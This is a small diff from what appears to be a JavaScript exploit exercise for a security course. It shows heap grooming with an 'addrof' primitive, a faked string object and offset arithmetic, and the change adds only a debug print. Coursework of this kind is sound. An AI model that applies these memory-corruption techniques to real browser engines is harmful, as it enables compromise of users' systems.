@@ -11,6 +11,10 @@ while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(faked
     array = new Uint32Array(72);
 }
 
+let testing = function(){
+    print(heapArray);
+};
+
 let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakedStr) + 16);
 let bytes = new Uint8Array(72);
 for (let i = 0; i < 72; i++) {
